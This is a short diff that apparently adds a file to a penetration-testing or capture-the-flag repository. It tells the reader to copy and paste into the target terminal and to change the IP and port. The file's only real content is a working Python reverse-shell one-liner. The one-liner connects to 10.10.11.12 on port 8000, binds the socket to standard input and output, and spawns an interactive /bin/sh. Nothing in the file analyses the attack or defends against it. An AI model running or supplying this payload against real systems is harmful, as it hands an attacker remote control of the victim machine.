@@ -1,0 +1,3 @@
+Copy & Paste on Terminal Target. And, of course, if you read the README.md, you will realize you have to change the IP and Port!
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(2,1);s.connect(("10.10.11.12",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
